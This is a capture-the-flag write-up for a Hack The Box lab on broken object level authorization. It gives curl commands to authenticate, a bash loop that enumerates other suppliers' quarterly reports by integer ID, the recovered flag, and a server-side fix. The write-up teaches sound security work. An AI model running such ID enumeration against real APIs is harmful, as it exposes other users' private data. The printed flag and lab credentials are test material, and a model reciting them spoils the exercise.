# BOLA Exercise — HTB API Attacks Module

**Category:** Web / API  
**Vulnerability:** API1:2023 - Broken Object Level Authorization (BOLA)  
**CWE:** CWE-639: Authorization Bypass Through User-Controlled Key  
**Flag:** `HTB{e76651e1f516eb5d7260621c26754776}`

---

## Scenario

Authenticated as `htbpentester2@pentestercompany.com:HTBPentester2` (supplier account). Goal: find what data we can access beyond our own.

---

## Steps

### 1. Authenticate
```bash
curl -s -X POST 'http://<IP>:<PORT>/api/v1/authentication/suppliers/sign-in' \
  -H 'Content-Type: application/json' \
  -d '{"email":"htbpentester2@pentestercompany.com","password":"HTBPentester2"}' | jq
```

### 2. Identify own supplier ID
```bash
curl -s -X GET 'http://<IP>:<PORT>/api/v1/suppliers/current-user' \
  -H 'Authorization: Bearer '$JWT | jq
```
Own supplierID: `781391c3-c6e3-4f42-bea4-1e71b6d9b4e7`

### 3. Decode JWT roles
Two roles: `SupplierCompanies_GetYearlyReportByID`, `Suppliers_GetQuarterlyReportByID`  
Second role maps to: `GET /api/v1/suppliers/quarterly-reports/{ID}` (integer ID, no ownership check)

### 4. Enumerate quarterly reports
```bash
for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X GET \
    'http://<IP>:<PORT>/api/v1/suppliers/quarterly-reports/'$i \
    -H 'Authorization: Bearer '$JWT | jq
done
```

### 5. Flag found in ID=8
```json
{
  "id": 8,
  "supplierID": "b2d1a1a9-d5bb-4973-bbe4-9a605b6f0da4",
  "commentsFromManager": "HTB{e76651e1f516eb5d7260621c26754776}"
}
```

---

## Why it works

Server checks the role but never verifies the report belongs to the authenticated user. Integer IDs make enumeration trivial.

---

## Fix

After fetching report by ID, compare `report.supplierID` against the authenticated user's supplierID. Return 403 if mismatch.
